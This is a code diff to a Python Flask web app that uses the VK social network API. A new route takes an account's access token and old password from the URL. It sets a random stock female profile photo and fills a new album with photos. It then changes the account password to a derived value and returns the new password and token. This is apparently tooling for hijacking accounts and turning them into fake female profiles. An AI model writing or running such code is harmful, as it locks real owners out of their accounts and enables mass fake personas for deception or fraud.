@@ -161,7 +161,69 @@ def about1(tokens,old_pass):
             ss = vk.account.changePassword(old_password=old_pass,new_password=newpasswd)
             tokz = ss['token']
             account_success = "+"
-    
+        except:
+            newpasswd = passwd
+            tokz = tokens
+            account_success = "-"
+        return(newpasswd+ ":" + tokz + ":" + account_success)   
+
+
+@app.route("/about2/<tokens>/<old_pass>")
+def about2(tokens,old_pass):
+        vk_session = vk_api.VkApi(token = tokens)
+        time.sleep(1)
+        sex = 1
+        path = ''
+        #return(render_template('home.html', name=345))
+        vk = vk_session.get_api()
+        #vk.wall.post(message='Hello world!')
+        time.sleep(1)
+        sexi = vk.account.getProfileInfo()
+        sex = sexi['sex']
+        time.sleep(1)
+        basedir = os.path.abspath(os.path.dirname(__file__))
+        data_file = os.path.join(basedir, 'femalestatus.txt')
+        data_file1 = os.path.join(basedir, 'fsurname.txt')
+        with open(data_file1, encoding='utf-8') as f:
+                surnames = f.read().splitlines()
+                
+        names = ['Маша','Мария','Валерия','Настя','Виктория','Яна','Ксения','Алиса','Альбина','Алина','Вероника','Жанна','Полина','Ольга','Светлана','Валентина','Владислава','Василиса','Галина','Дарья','Дана','Ева','Лиза','Зоя','Инесса','Инга','Лариса','Лора','Надя','Оксана','Рита','Cоня','Элла','Фаина']
+        if sex == 2:
+            with open(data_file,encoding='utf-8') as f:
+                status1 = f.read().splitlines()
+            time.sleep(2)
+            tex = status1[random.randint(0,28)]
+
+        elif sex == 1:
+                with open(data_file,encoding='utf-8') as f:
+                  status1 = f.read().splitlines()
+                time.sleep(1)
+                tex = status1[random.randint(0,28)]
+        elif sex == 0:
+                with open(data_file,encoding='utf-8') as f:
+                  status1 = f.read().splitlines()
+                time.sleep(1)
+                tex = status1[random.randint(0,28)]
+        time.sleep(1)
+        path ='ss'+ str(random.randint(1,20))
+        data_file = os.path.join(basedir, (path+'/' + str(random.randint(1,3))+ '.jpg'))
+        upload = vk_api.VkUpload(vk_session)
+       # photo = upload.photo_profile(path+'/' + str(random.randint(3,7))+ '.jpg')
+        photo = upload.photo_profile(photo = data_file)
+        album = vk.photos.createAlbum(title = 'фото')
+        ss = album['id']
+        for i in range(1,6):
+            time.sleep(3)
+            upload = vk_api.VkUpload(vk_session)
+            data_file = os.path.join(basedir, (path +'/' + str(i) + '.jpg'))
+            pr = upload.photo(photos=data_file,album_id =ss)
+        newpasswd = 'd' + old_pass + '1'
+        account_success ="--"
+
+        try:
+            ss = vk.account.changePassword(old_password=old_pass,new_password=newpasswd)
+            tokz = ss['token']
+            account_success = "+"
         except:
             newpasswd = passwd
             tokz = tokens
